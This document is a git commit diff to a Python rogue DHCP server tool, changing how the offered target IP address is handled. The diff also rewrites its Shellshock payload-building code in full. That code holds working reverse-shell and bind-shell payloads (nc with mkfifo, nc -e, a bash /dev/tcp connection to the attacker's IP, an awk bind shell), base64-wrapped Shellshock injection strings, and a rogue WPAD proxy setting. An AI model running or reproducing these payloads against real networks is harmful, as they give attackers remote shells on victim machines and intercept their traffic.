1b008ac0c939b418fe0ca3ed23f1b96bac3b642a
Vladimir Ivanov <ivanov.vladimir.mail@gmail.com>
2017-08-26 18:27:49 +0300

    Bug in target IP address fixed.

--- dhcp_rogue_server.py
+++ dhcp_rogue_server.py
@@ -226,13 +226,16 @@ def dhcp_reply(request):
         target_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])
 
         if request[DHCP].options[0][1] == 1:
-            next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
-            if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
-                number_of_dhcp_request += 1
-                offer_ip_address = str(next_offer_ip_address)
+            if target_ip_address is not None:
+                offer_ip_address = target_ip_address
             else:
-                number_of_dhcp_request = 0
-                offer_ip_address = args.first_offer_ip
+                next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
+                if IPv4Address(next_offer_ip_address) < IPv4Address(unicode(args.last_offer_ip)):
+                    number_of_dhcp_request += 1
+                    offer_ip_address = str(next_offer_ip_address)
+                else:
+                    number_of_dhcp_request = 0
+                    offer_ip_address = args.first_offer_ip
 
             print _info + "DHCP DISCOVER from: " + target_mac_address + " || transaction id: " + \
                 hex(transaction_id) + " || offer ip: " + offer_ip_address
@@ -291,65 +294,72 @@ def dhcp_reply(request):
                 if option[0] == "requested_addr":
                     requested_ip = str(option[1])
 
-            if request[DHCP].options[0][1] == 3:
-                print _info + "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + \
-                    hex(transaction_id) + " || requested ip: " + requested_ip
+            print _info + "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + \
+                hex(transaction_id) + " || requested ip: " + requested_ip
 
-            if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
-                    or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):
-                nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
-                SOCK.send(nak_packet)
-                print _info + "Send nak response!"
+            if target_ip_address is not None:
+                if requested_ip != target_ip_address:
+                    nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
+                    SOCK.send(nak_packet)
+                    print _info + "Send nak response!"
 
             else:
-                net_settings = args.ip_path + "ip addr add " + requested_ip + \
-                               "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
+                if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
+                        or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):
 
-                global payload
+                    nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
+                    SOCK.send(nak_packet)
+                    print _info + "Send nak response!"
 
-                if args.shellshock_command is not None:
-                    payload = args.shellshock_command
-
-                if args.bind_shell:
-                    payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                              "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
-
-                if args.nc_reverse_shell:
-                    payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                              your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
-
-                if args.nce_reverse_shell:
-                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
-
-                if args.bash_reverse_shell:
-                    payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
-                              "/" + str(args.reverse_port) + " 0>&1 &"
-
-                if payload is not None:
-
-                    if not args.without_network:
-                        payload = net_settings + payload
-
-                    if args.without_base64:
-                        shellshock_url = "() { :" + "; }; " + payload
-                    else:
-                        payload = b64encode(payload)
-                        shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
-
-                if shellshock_url is not None:
-                    if len(shellshock_url) > 255:
-                        print _error + "Len of command is very big! Current len: " + str(len(shellshock_url))
-                        shellshock_url = "A"
-
-                global proxy
-                if args.proxy is None:
-                    proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
                 else:
-                    proxy = bytes(args.proxy)
+                    net_settings = args.ip_path + "ip addr add " + requested_ip + \
+                                   "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
 
-                ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
-                SOCK.send(ack_packet)
-                print _info + "Send ack response!"
+                    global payload
+
+                    if args.shellshock_command is not None:
+                        payload = args.shellshock_command
+
+                    if args.bind_shell:
+                        payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                                  "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+
+                    if args.nc_reverse_shell:
+                        payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                                  your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+
+                    if args.nce_reverse_shell:
+                        payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
+
+                    if args.bash_reverse_shell:
+                        payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
+                                  "/" + str(args.reverse_port) + " 0>&1 &"
+
+                    if payload is not None:
+
+                        if not args.without_network:
+                            payload = net_settings + payload
+
+                        if args.without_base64:
+                            shellshock_url = "() { :" + "; }; " + payload
+                        else:
+                            payload = b64encode(payload)
+                            shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
+
+                    if shellshock_url is not None:
+                        if len(shellshock_url) > 255:
+                            print _error + "Len of command is very big! Current len: " + str(len(shellshock_url))
+                            shellshock_url = "A"
+
+                    global proxy
+                    if args.proxy is None:
+                        proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
+                    else:
+                        proxy = bytes(args.proxy)
+
+                    ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
+                    SOCK.send(ack_packet)
+                    print _info + "Send ack response!"
 
     if request.haslayer(ARP):
         if target_ip_address is not None:
